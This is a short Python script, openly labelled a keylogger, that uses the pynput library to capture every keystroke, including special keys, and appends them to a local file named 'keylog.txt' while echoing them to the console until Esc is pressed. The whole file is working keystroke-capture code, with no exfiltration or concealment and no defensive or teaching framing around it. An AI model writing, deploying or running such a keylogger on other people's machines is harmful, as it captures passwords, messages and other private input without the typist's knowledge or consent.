from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

# Mapping special keys for better readability
special_keys = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "[TAB]",
    keyboard.Key.backspace: "[BACKSPACE]",
    keyboard.Key.shift: "[SHIFT]",
    keyboard.Key.ctrl_l: "[CTRL]",
    keyboard.Key.ctrl_r: "[CTRL]",
    keyboard.Key.esc: "[ESC]"
}

def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Handle special keys
            if key in special_keys:
                log_file.write(special_keys[key])
                print(special_keys[key], end="")
            elif hasattr(key, 'char') and key.char:
                log_file.write(key.char)
                print(key.char, end="")
            else:
                log_file.write(f"[{key}]")
                print(f"[{key}]", end="")
    except Exception as e:
        print(f"\nError: {e}")

# Stop recording when 'Esc' is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# Start keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print(f"\nKeylogging finished. Logs saved in '{LOG_FILE}'")
